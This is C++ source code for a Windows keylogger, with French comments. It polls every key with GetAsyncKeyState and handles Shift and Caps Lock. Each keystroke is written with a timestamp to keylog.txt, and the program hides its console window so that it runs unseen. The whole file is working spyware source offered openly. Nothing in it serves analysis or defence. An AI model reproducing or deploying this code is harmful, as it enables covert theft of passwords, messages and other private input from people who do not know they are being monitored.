#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <ctime>
#include <map>

using namespace std;

// Fonction pour obtenir le timestamp
string getTimestamp() {
    time_t now = time(0);
    char buffer[80];
    struct tm timeinfo;
    localtime_s(&timeinfo, &now);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
    return string(buffer);
}

// Écrit dans le fichier avec timestamp
void logKey(const string& key) {
    ofstream data("keylog.txt", ios::app);
    if (data.is_open()) {
        data << "[" << getTimestamp() << "] " << key << endl;
        data.close();
    } else {
        // En cas d'erreur, on peut loguer dans la console ou ignorer
        cerr << "Erreur : impossible d'ouvrir keylog.txt" << endl;
    }
}

// États précédents des touches pour éviter les répétitions
map<int, bool> keyPressed;

// Vérifie si une touche virtuelle est pressée (sans répétition)
bool isKeyPressed(int vKey) {
    if (GetAsyncKeyState(vKey) & 0x8000) {
        if (!keyPressed[vKey]) {
            keyPressed[vKey] = true;
            return true;
        }
    } else {
        keyPressed[vKey] = false;
    }
    return false;
}

// Retourne l'état du Caps Lock
bool isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

// Retourne l'état de Shift
bool isShiftPressed() {
    return (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
}

// Convertit une touche virtuelle en texte lisible
string virtualKeyToString(int vKey) {
    // Gestion des lettres A-Z
    if (vKey >= 'A' && vKey <= 'Z') {
        bool shift = isShiftPressed();
        bool caps = isCapsLockOn();
        char c = static_cast<char>(vKey);

        if (caps != shift) {
            return string(1, c);        // Majuscule
        } else {
            return string(1, c + 32);  // Minuscule
        }
    }

    // Chiffres et symboles du pavé principal
    if (vKey >= '0' && vKey <= '9') {
        if (isShiftPressed()) {
            const string shiftSymbols = ")!@#$%^&*(";
            return string(1, shiftSymbols[vKey - '0']);
        } else {
            return string(1, static_cast<char>(vKey));
        }
    }

    // Symboles spéciaux (basés sur la disposition US QWERTY)
    static const map<int, pair<string, string>> specialKeys = {
        {VK_OEM_1,      {";", ":"}},
        {VK_OEM_2,      {"/", "?"}},
        {VK_OEM_3,      {"`", "~"}},
        {VK_OEM_4,      {"[", "{"}},
        {VK_OEM_5,      {"\\", "|"}},
        {VK_OEM_6,      {"]", "}"}},
        {VK_OEM_7,      {"'", "\""}},
        {VK_OEM_PLUS,   {"=", "+"}},
        {VK_OEM_COMMA,  {",", "<"}},
        {VK_OEM_MINUS,  {"-", "_"}},
        {VK_OEM_PERIOD, {".", ">"}}
    };

    auto it = specialKeys.find(vKey);
    if (it != specialKeys.end()) {
        return isShiftPressed() ? it->second.second : it->second.first;
    }

    // Touches de contrôle
    switch (vKey) {
        case VK_RETURN:     return "[ENTER]";
        case VK_SPACE:      return " ";
        case VK_TAB:        return "[TAB]";
        case VK_BACK:       return "[BACKSPACE]";
        case VK_DELETE:     return "[DELETE]";
        case VK_ESCAPE:     return "[ESC]";
        case VK_CONTROL:    return "[CTRL]";
        case VK_LCONTROL:   return "[LCTRL]";
        case VK_RCONTROL:   return "[RCTRL]";
        case VK_MENU:       return "[ALT]";
        case VK_LMENU:      return "[LALT]";
        case VK_RMENU:      return "[RALT]";
        case VK_SHIFT:      return "[SHIFT]";
        case VK_LSHIFT:     return "[LSHIFT]";
        case VK_RSHIFT:     return "[RSHIFT]";
        case VK_CAPITAL:    return "[CAPSLOCK]";
        case VK_UP:         return "[UP]";
        case VK_DOWN:       return "[DOWN]";
        case VK_LEFT:       return "[LEFT]";
        case VK_RIGHT:      return "[RIGHT]";
        case VK_F1:         return "[F1]";
        case VK_F2:         return "[F2]";
        case VK_F3:         return "[F3]";
        case VK_F4:         return "[F4]";
        case VK_F5:         return "[F5]";
        case VK_F6:         return "[F6]";
        case VK_F7:         return "[F7]";
        case VK_F8:         return "[F8]";
        case VK_F9:         return "[F9]";
        case VK_F10:        return "[F10]";
        case VK_F11:        return "[F11]";
        case VK_F12:        return "[F12]";
        case VK_HOME:       return "[HOME]";
        case VK_END:        return "[END]";
        case VK_PRIOR:      return "[PAGE_UP]";
        case VK_NEXT:       return "[PAGE_DOWN]";
        case VK_INSERT:     return "[INSERT]";
        case VK_SNAPSHOT:   return "[PRINT_SCREEN]";
        case VK_SCROLL:     return "[SCROLL_LOCK]";
        case VK_PAUSE:      return "[PAUSE]";
        default:            return "";
    }
}

int main() {
    // Cacher la console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    cout << "Keylogger actif. Appuyez sur CTRL+C pour arrêter (en mode debug)." << endl;

    // Boucle principale
    while (true) {
        Sleep(10); // Réduit la charge CPU

        for (int vKey = 8; vKey < 256; ++vKey) {
            if (isKeyPressed(vKey)) {
                string keyStr = virtualKeyToString(vKey);
                if (!keyStr.empty()) {
                    logKey(keyStr);
                }
            }
        }
    }

    return 0;
}